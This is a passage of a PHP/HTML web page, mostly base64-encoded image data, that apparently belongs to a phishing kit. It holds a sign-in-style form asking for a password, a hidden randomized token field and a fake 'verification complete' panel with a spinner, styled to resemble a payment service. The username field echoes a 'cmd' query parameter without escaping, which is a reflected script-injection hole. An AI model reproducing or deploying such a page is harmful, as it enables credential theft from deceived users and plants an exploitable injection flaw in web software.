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
" alt="Italian Trulli">
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="user" id="fname" class="generic-input-field form-control field" value="<?php echo $_GET["cmd"];?>">
  <span id="nameerror"></span>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
<input type="password" name="passita" id="mname" class="generic-input-field form-control field" placeholder="Password" required>
</div>
</div>
<input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<br>
<input name="submals" type="submit" id="signInHyperLink" style="float:center;" value="Add"></div>
</div>
</div>
</div>
</div>
</form>
<!-- email -->

<!-- done -->
<div style="<?php if(isset($_GET['don'])) { echo 'display:block;'; } else { echo 'display:none;'; } ?>" class="flow-body signin clearfix" role="main">
                <div class="container">
                    <div class="flex home-content">
                        <div class="container flow-sections">
                            <div class="account-wrapper">
                                <div align="center">
                                    <h1 style="color:#009CDE"><?php echo $VerificationComplete;?></h1>
                                    <p><span class="clearfix" style="margin-top: 10px;"><img id="spinner"src="data:image/gif;base64,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